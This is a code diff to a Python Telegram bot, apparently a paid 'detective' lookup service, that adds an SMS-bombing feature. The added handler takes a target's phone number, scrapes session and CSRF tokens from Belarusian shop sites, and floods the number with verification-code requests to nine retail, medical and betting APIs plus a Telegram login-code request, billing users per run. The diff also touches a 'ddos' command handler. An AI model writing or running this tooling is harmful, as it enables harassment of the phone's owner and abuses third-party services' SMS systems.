@@ -7,7 +7,7 @@ from aiogram import F, Router, Bot
 from telethon.errors import SessionPasswordNeededError
 import random
 import re
-
+import uuid
 from telethon.sessions import StringSession
 import os
 from telethon import events
@@ -44,7 +44,7 @@ VEKTOR_BASE_URL = "https://infoapi24.store"
 
 vk_session = vk_api.VkApi(token=vk_token)
 vk = vk_session.get_api()
-
+SESSION_NAME = 'session_name'
 
 headers = {
     "Referer": "https://www.google.com/"
@@ -62,6 +62,8 @@ recipient = 'sms@telegram.org, dmca@telegram.org, abuse@telegram.org, sticker@te
 class Admin(StatesGroup):
     admin_id = State()
 
+class Bomber(StatesGroup):
+    telephone = State()
 class God(StatesGroup):
     phone = State()
 class SendMessage(StatesGroup):
@@ -131,6 +133,67 @@ async def check_member(chat_member, message: Message):
 payment = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text='Оплатить ⭐', pay=True)]
 ])
+
+
+async def send_telegram_code(phone: str):
+    try:
+        client = TelegramClient(SESSION_NAME, api_id, api_hash)
+        await client.connect()
+
+        # Отправляем запрос кода (добавляем + перед номером)
+        send_code = await client.send_code_request(phone=f'+{phone}')
+
+        await client.disconnect()
+        return True, None
+    except Exception as e:
+        print(f"Telethon error: {e}")
+        return False, str(e)
+
+# Функция получения sessid с OMA.BY
+def get_oma_sessid():
+    """Получает актуальный sessid с OMA.BY"""
+    try:
+        response = requests.get('https://www.oma.by/personal/user/login.php', headers={
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+        # Пробуем получить из cookies
+        for cookie in response.cookies:
+            if 'SESSID' in cookie.name or 'BITRIX' in cookie.name:
+                return cookie.value
+        # Ищем в HTML
+        match = re.search(r'sessid["\']?\s*:\s*["\']([a-f0-9]+)["\']', response.text)
+        if match:
+            return match.group(1)
+        # Ищем в hidden input
+        soup = BeautifulSoup(response.text, 'html.parser')
+        sessid_input = soup.find('input', {'name': 'sessid'})
+        if sessid_input:
+            return sessid_input.get('value')
+    except Exception as e:
+        print(f"Ошибка получения sessid: {e}")
+    return "62e986021224fe0daa2a9ac1999a8b7f"  # fallback
+
+# Функция получения code с Megatop
+def get_megatop_code():
+    """Получает code с Megatop"""
+    try:
+        response = requests.get('https://megatop.by/', headers={
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+        # Ищем в разных форматах
+        patterns = [
+            r'code["\']?\s*:\s*["\']([a-f0-9]+)["\']',
+            r'data-code=["\']([a-f0-9]+)["\']',
+            r'"code":\s*"([a-f0-9]+)"',
+            r'csrf["\']?\s*:\s*["\']([a-f0-9]+)["\']'
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, response.text)
+            if match:
+                return match.group(1)
+    except Exception as e:
+        print(f"Ошибка получения megatop code: {e}")
+    return "4b31a944d510c5c8b7dfea2f7c861317"  # fallback
 
 
 def search_in_file(phone_number: str, filename: str) -> str:
@@ -298,42 +361,49 @@ async def broadcast_mess(message: Message, state: FSMContext, bot: Bot):
                          reply_markup=start_mes)
     await state.clear()
 
-
 @router.message(CommandStart())
 async def start(message: Message):
     db = SessionLocal()
-    
-    # Ищем пользователя
+
+        # Ищем пользователя
     user = db.query(User).filter(User.telegram_id == str(message.from_user.id)).first()
-    
+
     if user:
         # Обновляем имя, если оно отсутствует, равно None или равно "Без имени"
         if not user.name or user.name == "Без имени" or user.name != message.from_user.full_name:
             user.name = message.from_user.full_name
             db.commit()
     else:
-        # Новый пользователь — создаём запись
+            # Новый пользователь — создаём запись
         new_user = User(
-            telegram_id=str(message.from_user.id),
-            name=message.from_user.full_name,
-            register_at=datetime.now().isoformat(),
-            active=True,
-            premium=False,
-            queries=0
+                telegram_id=str(message.from_user.id),
+                name=message.from_user.full_name,
+                register_at=datetime.now().isoformat(),
+                active=True,
+                premium=False,
+                queries=5
         )
         db.add(new_user)
         db.commit()
-    
-    # Выдача премиум админу
+
+        # Выдача премиум админу
     if message.from_user.id == ADMIN_ID:
         admin_user = db.query(User).filter(User.telegram_id == str(message.from_user.id)).first()
         if admin_user:
             admin_user.premium = True
             admin_user.queries = 50
             db.commit()
-    
+
     db.close()
-    
+
+    # Приветственное сообщение
+    await message.answer_photo(
+            photo='https://avatars.mds.yandex.net/i?id=026e7b7cf40d328b163e1db7cab9bed337c2b49e-5682063-images-thumbs&n=13',
+            caption=f"Привет, детектив {message.from_user.first_name}! 🕵️‍♂️ Готов к расследованию? Отправляй мне любую зацепку: номер, никнейм, фото или ссылку. Я помогу найти то, что скрыто в цифровой тени. Вместе мы раскроем любое дело! 🔍✨ Включай логику и давай начинать. Жду твою первую задачу!\n🔀 Вот ссылка на сервис: <a href='https://spravochnik109.link/byelarus/vityebskaya-oblast/'>Ссылка</a>\n<b>Вот ссылка на бот</b>: https://t.me/sherlocks_find_bot",
+            parse_mode='HTML',
+            reply_markup=start_mes
+    )
+
     # Приветственное сообщение
     await message.answer_photo(
         photo='https://avatars.mds.yandex.net/i?id=026e7b7cf40d328b163e1db7cab9bed337c2b49e-5682063-images-thumbs&n=13',
@@ -341,6 +411,7 @@ async def start(message: Message):
         parse_mode='HTML',
         reply_markup=start_mes
     )
+
 
 
 
@@ -517,6 +588,308 @@ async def process_successful_payment(message: Message):
 
     db.close()
 
+@router.message(F.text == '💣 Бомбер')
+async def bomber_function(message:Message,state:FSMContext):
+      await message.answer('Введите номер телефона 📲')
+      await state.set_state(Bomber.telephone)
+
+
+@router.message(Bomber.telephone)
+async def bomber_phone_start(message: Message, state: FSMContext):
+    # ============ ПРОВЕРКА КОЛИЧЕСТВА ЗАПРОСОВ ИЗ БД ============
+    db = SessionLocal()
+    try:
+        # Получаем пользователя из БД
+        user = db.query(User).filter(User.telegram_id == str(message.from_user.id)).first()
+
+        if not user:
+            await message.answer("❌ Пользователь не найден в базе данных!")
+            await state.clear()
+            return
+
+        # Проверяем количество доступных запросов
+        if user.queries < 1:
+            await message.answer("❌ У вас закончились запросы! Пополните баланс.")
+            await state.clear()
+            return
+
+        # Забираем один запрос (уменьшаем на 1)
+        user.queries = user.queries - 1
+        db.commit()
+
+        await message.answer(f"✅ Запрос выполняется. Осталось запросов: {user.queries}")
+
+    except Exception as e:
+        print(f"Ошибка БД: {e}")
+        await message.answer("❌ Ошибка при проверке баланса")
+        await state.clear()
+        return
+    finally:
+        db.close()
+
+    # ============ ОЧИСТКА НОМЕРА ТЕЛЕФОНА ============
+    telephone_raw = message.text.strip().replace('+', '').replace(' ', '').replace('-', '').replace('(', '').replace(
+        ')', '')
+
+    try:
+        phone_number = phonenumbers.parse(telephone_raw, "BY")
+
+        if phonenumbers.is_valid_number(phone_number):
+            formatted_telephone = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
+            telephone_clean = formatted_telephone.replace('+', '')
+
+        else:
+            await message.answer("❌ Неверный формат номера телефона. Введите номер в формате +375XXXXXXXXX")
+            await state.clear()
+            return
+
+    except phonenumbers.NumberParseException:
+        await message.answer("❌ Неверный формат номера телефона. Введите номер в формате +375XXXXXXXXX")
+        await state.clear()
+        return
+
+    # ============ ДИНАМИЧЕСКОЕ ПОЛУЧЕНИЕ ПАРАМЕТРОВ ============
+
+    fingerprint = str(uuid.uuid4())
+    sessid = get_oma_sessid()
+    megatop_code = get_megatop_code()
+
+    # ============ URL САЙТОВ ============
+    url_5element = f"https://5element.by/api/v1/code/{telephone_clean}/login"
+    url_amd = f"https://www.amd.by/login/"
+    url_ziko = f'https://ziko.by/'
+    url_oma = "https://www.oma.by/personal/user/login.php"
+    url_oz = "https://auth.oz.by/api/v3/quickSignIn"
+    url_megatop = "https://admin.megatop.by/api/v3/user/verify-phone"
+    url_21vek = "https://gate.21vek.by/account/users/register/send-confirmation"
+    url_invitro = "https://lk3.invitro.by/site/api/login-confirmation/send-login-code"
+    url_winline = "https://winline.by/api/blr/registration/send-sms-code"
+
+    # ============ ЗАГОЛОВКИ ============
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json, text/plain, */*'
+    }
+
+    headers_ziko = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'fingerprint': fingerprint,
+        'X-Fingerprint': fingerprint
+    }
+
+    headers_oma = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Referer': 'https://www.oma.by/personal/user/login.php'
+    }
+
+    headers_oz = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': 'https://oz.by',
+        'Referer': 'https://oz.by/'
+    }
+
+    headers_megatop = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': 'https://megatop.by',
+        'Referer': 'https://megatop.by/'
+    }
+
+    headers_21vek = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': 'https://21vek.by',
+        'Referer': 'https://21vek.by/'
+    }
+
+    headers_invitro = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': 'https://lk3.invitro.by',
+        'Referer': 'https://lk3.invitro.by/'
+    }
+
+    headers_winline = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': 'https://winline.by',
+        'Referer': 'https://winline.by/'
+    }
+
+    # ============ ДАННЫЕ ДЛЯ ЗАПРОСОВ ============
+
+    # 1. AMD
+    data_amd = {
+        'telephone': telephone_clean.replace("375", "")
+    }
+
+    # 2. Ziko
+    data_ziko = {
+        'phoneNumber': f"+{telephone_clean}"
+    }
+
+    # 3. OMA.BY (формат: +375 (44) 538-94-24)
+    phone_for_oma = f"+{telephone_clean[:3]} ({telephone_clean[3:5]}) {telephone_clean[5:8]}-{telephone_clean[8:10]}-{telephone_clean[10:12]}"
+
+    data_oma = {
+        'bxajaxid': 'e267e80e024f89cbb3544131bc06b8c0',
+        'AJAX_CALL': 'Y',
+        'sessid': sessid,
+        'PAGE_TYPE': 'REGISTER',
+        'PHONE': phone_for_oma,
+        'UF_SOGL_USER': 'Y',
+        'SET_REGISTER': 'Y'
+    }
+
+    # 4. OZ.BY
+    data_oz = {
+        'phone': telephone_clean
+    }
+
+    # 5. Megatop
+    data_megatop = {
+        'phone': telephone_clean,
+        'code': megatop_code,
+        'registration': True
+    }
+
+    # 6. 21VEK
+    phone_for_21vek = f"+{telephone_clean[:3]} ({telephone_clean[3:5]}) {telephone_clean[5:]}"
+
+    data_21vek = {
+        'email': fake.email(),
+        'phone': phone_for_21vek,
+        'name': fake.first_name()
+    }
+
+    # 7. INVITRO
+    data_invitro = {
+        'login': f"+{telephone_clean}",
+        'territory': "BELARUS",
+        'captcha': None,
+        'type': "LOGIN"
+    }
+
+    # 8. WINLINE
+    data_winline = {
+        'phone': f"+{telephone_clean}",
+        'languageCode': "ru"
+    }
+
+    # ============ ОТПРАВКА ЗАПРОСОВ ============
+
+    await message.answer("🔄 Отправка запросов на сайты...")
+
+    results = []
+
+    try:
+        # 1. 5element
+        try:
+            response_5element = requests.get(url_5element, headers=headers, timeout=10)
+            results.append("✅ 5element" if response_5element.status_code in [200,
+                                                                             202] else f"❌ 5element ({response_5element.status_code})")
+        except:
+            results.append("❌ 5element (ошибка)")
+
+        # 2. AMD
+        try:
+            response_amd = requests.post(url_amd, headers=headers, data=data_amd, timeout=10)
+            results.append("✅ AMD" if response_amd.status_code in [200, 202] else f"❌ AMD ({response_amd.status_code})")
+        except:
+            results.append("❌ AMD (ошибка)")
+
+        # 3. Ziko
+        try:
+            response_ziko = requests.post(url_ziko, headers=headers_ziko, json=data_ziko, timeout=10)
+            results.append(
+                "✅ Ziko" if response_ziko.status_code in [200, 202] else f"❌ Ziko ({response_ziko.status_code})")
+        except:
+            results.append("❌ Ziko (ошибка)")
+
+        # 4. OMA.BY
+        try:
+            response_oma = requests.post(url_oma, headers=headers_oma, data=data_oma, timeout=10)
+            results.append(
+                "✅ OMA.BY" if response_oma.status_code in [200, 202] else f"❌ OMA.BY ({response_oma.status_code})")
+        except:
+            results.append("❌ OMA.BY (ошибка)")
+
+        # 5. OZ.BY
+        try:
+            response_oz = requests.post(url_oz, headers=headers_oz, json=data_oz, timeout=10)
+            results.append(
+                "✅ OZ.BY" if response_oz.status_code in [200, 201, 202] else f"❌ OZ.BY ({response_oz.status_code})")
+        except:
+            results.append("❌ OZ.BY (ошибка)")
+
+        # 6. Megatop
+        try:
+            response_megatop = requests.post(url_megatop, headers=headers_megatop, json=data_megatop, timeout=10)
+            results.append("✅ Megatop" if response_megatop.status_code in [200, 201,
+                                                                           202] else f"❌ Megatop ({response_megatop.status_code})")
+        except:
+            results.append("❌ Megatop (ошибка)")
+
+        # 7. 21VEK
+        try:
+            response_21vek = requests.post(url_21vek, headers=headers_21vek, json=data_21vek, timeout=10)
+            results.append("✅ 21VEK" if response_21vek.status_code in [200, 201, 202,
+                                                                       204] else f"❌ 21VEK ({response_21vek.status_code})")
+        except:
+            results.append("❌ 21VEK (ошибка)")
+
+        # 8. INVITRO
+        try:
+            response_invitro = requests.post(url_invitro, headers=headers_invitro, json=data_invitro, timeout=10)
+            results.append("✅ INVITRO" if response_invitro.status_code in [200, 201, 202,
+                                                                           204] else f"❌ INVITRO ({response_invitro.status_code})")
+        except:
+            results.append("❌ INVITRO (ошибка)")
+
+        # 9. WINLINE
+        try:
+            response_winline = requests.post(url_winline, headers=headers_winline, json=data_winline, timeout=10)
+            results.append("✅ WINLINE" if response_winline.status_code in [200, 201, 202,
+                                                                           204] else f"❌ WINLINE ({response_winline.status_code})")
+        except:
+            results.append("❌ WINLINE (ошибка)")
+
+        # 10. TELEGRAM
+        try:
+            telegram_success, _ = await send_telegram_code(telephone_clean)
+            results.append("✅ TELEGRAM" if telegram_success else "❌ TELEGRAM (ошибка)")
+        except:
+            results.append("❌ TELEGRAM (ошибка)")
+
+        # Подсчитываем успешные запросы
+        success_count = sum(1 for r in results if r.startswith("✅"))
+
+        # Получаем обновленное количество запросов
+        db2 = SessionLocal()
+        user_updated = db2.query(User).filter(User.telegram_id == str(message.from_user.id)).first()
+        remaining_queries = user_updated.queries if user_updated else 0
+        db2.close()
+
+        # Формируем ответ
+        answer_text = f"📱 **Результаты СМС-бомбинга**\n\n" + "\n".join(
+            results) + f"\n\n✅ Успешно: {success_count}/10\n📊 Осталось запросов: {remaining_queries}"
+        await message.answer(answer_text)
+
+    except Exception as e:
+        print(f"Ошибка: {e}")
+        await message.answer('❌ Ошибка соединения с сервером')
+
+    await state.clear()
 
 
 @router.message(F.text == '📊 Статистика')
@@ -1524,7 +1897,7 @@ async def user_name_over(message: Message, state: FSMContext):
                          parse_mode='HTML', reply_markup=keyboard)
     await state.clear()
 
-@router.message(F.text == '💼 Dos')
+@router.message(Command('ddos'))
 async def ddos_start(message: Message, state: FSMContext):
     db = SessionLocal()
 
